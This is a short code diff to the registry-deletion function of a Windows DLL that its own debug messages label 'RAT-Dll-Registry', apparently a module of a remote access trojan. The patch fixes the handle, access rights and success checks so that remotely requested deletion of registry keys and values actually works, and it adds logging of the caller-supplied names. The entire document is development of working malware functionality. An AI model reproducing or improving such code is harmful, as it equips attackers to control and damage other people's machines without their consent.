@@ -378,7 +378,7 @@ INT performRegDelete(__in bool isKey, __in char* keyPath, __in char* value)
 
 	OutputDebugStringA("RAT-Dll-Registry::performRegDelete - Got hive key! Opening sub key...\n");
 
-	status = RegOpenKeyExA(hiveKeyValue, subKey, 0, KEY_READ, &openRegKey);
+	status = RegOpenKeyExA(hiveKeyValue, subKey, 0, KEY_SET_VALUE, &openRegKey);
 	if (status != ERROR_SUCCESS)
 	{
 		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - Failure recevied from RegOpenKeyExA %d\n", status);
@@ -392,10 +392,13 @@ INT performRegDelete(__in bool isKey, __in char* keyPath, __in char* value)
 	// Check to see if we're deleting a key or value and make appropiate call 
 	if (isKey)
 	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - User passed hive subkey: %s\n", value);
+		OutputDebugStringA(msgBuf);
+
 		OutputDebugStringA("RAT-Dll-Registry::performRegDelete - Deleting a registry key...\n");
 
-		status = RegDeleteKeyA(hiveKeyValue, subKey);
-		if (status != SUCCESS)
+		status = RegDeleteKeyA(openRegKey, value);
+		if (status != ERROR_SUCCESS)
 		{
 			sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - Failure recevied from RegDeleteKeyA %d\n", status);
 			OutputDebugStringA(msgBuf);
@@ -407,16 +410,21 @@ INT performRegDelete(__in bool isKey, __in char* keyPath, __in char* value)
 
 	else
 	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - User passed value: %s\n", value);
+		OutputDebugStringA(msgBuf);
+
 		OutputDebugStringA("RAT-Dll-Registry::performRegDelete - Deleting a registry value...\n");
 
-		status = RegDeleteValueA(hiveKeyValue, subKey);
-		if (status != SUCCESS)
+		status = RegDeleteValueA(openRegKey, value);
+		if (status != ERROR_SUCCESS)
 		{
 			sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - Failure recevied from RegDeleteValueA %d\n", status);
 			OutputDebugStringA(msgBuf);
 			goto cleanup;
 		}		
 	}
+
+	status = SUCCESS;
 
 
 cleanup:
